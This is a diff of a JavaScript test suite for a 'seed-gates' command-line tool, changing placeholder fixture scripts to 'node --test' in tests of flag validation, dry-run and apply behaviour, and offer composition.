@@ -358,14 +704,14 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('--only with an unknown id is a usage error (exit 2), nothing written', () => {
-    mkProject({ scripts: { test: 'x' }, gates: { gates: [] } });
+    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [] } });
     const before = gatesRaw();
     assert.equal(main(['--cwd', cwd, '--apply', '--only', 'nope'], quiet()), 2);
     assert.equal(gatesRaw(), before);
   });
 
   it('mixed --dry-run --apply is a usage error (exit 2) — a consent-gated writer never lets the later flag win silently', () => {
-    mkProject({ scripts: { test: 'x' } });
+    mkProject({ scripts: { test: 'node --test' } });
     const io = quiet();
     assert.equal(main(['--cwd', cwd, '--dry-run', '--apply'], io), 2);
     assert.equal(main(['--cwd', cwd, '--apply', '--dry-run'], quiet()), 2, 'order must not matter');
@@ -374,7 +720,7 @@ describe('seed-gates — --apply appends exactly the consented entries', () => {
   });
 
   it('--only typos are loud in BOTH paths: dry-run rejects too, and an empty offer never masks the typo', () => {
-    mkProject({ scripts: { test: 'x' } });
+    mkProject({ scripts: { test: 'node --test' } });
     const dry = quiet();
     assert.equal(main(['--cwd', cwd, '--only', 'nope'], dry), 2, 'a dry-run --only typo is a usage error, never a silent filter');
     assert.match(dry.out.join('\n'), /nope/, 'the error names the unknown id');
@@ -425,7 +771,7 @@ describe('seed-gates — import direction + tier absence (structural)', () => {
   });
 
   it('the offer composes script entries + the conditional review-state candidate (buildOffer)', () => {
-    mkProject({ scripts: { test: 'x' }, config: { 'plan-execution': { review: 'council' } } });
+    mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'council' } } });
     const offer = buildOffer(cwd);
     assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'review-ledger']);
     const preview = formatPreview(offer);
